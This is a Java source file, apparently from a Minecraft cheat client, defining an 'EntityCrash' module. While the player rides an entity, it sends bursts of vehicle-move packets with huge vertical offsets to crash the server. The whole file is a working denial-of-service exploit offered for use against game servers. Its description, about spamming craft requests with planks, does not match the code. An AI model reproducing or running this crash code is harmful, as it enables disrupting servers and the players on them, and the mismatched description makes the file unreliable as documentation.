package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

@Feature.Manifest(category = Feature.Category.MISC, description = "Spam craft request packets. Use with planks in inventory for best results.")
public class EntityCrash extends Feature {

    @Op(name = "Speed", min = 1, max = 10000, inc = 100)
    public int speed = 1400;
    @Op(name = "Packet Count", min = 1, max = 50, inc = 1)
    public int packetCount = 24;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public EntityCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        Entity entity = Wrapper.INSTANCE.getLocalPlayer().getVehicle();
        if (entity == null) {
            ChatHelper.INSTANCE.addClientMessage("ERROR! You must be riding an entity for this!");
            setState(false);
            return;
        }
        for (int i = 0; i < packetCount; i++) {
            Vec3d v = entity.getPos();
            entity.setPos(v.x, v.y + speed, v.z);
            VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(entity);
            NetworkHelper.INSTANCE.sendPacket(packet);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));


    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}
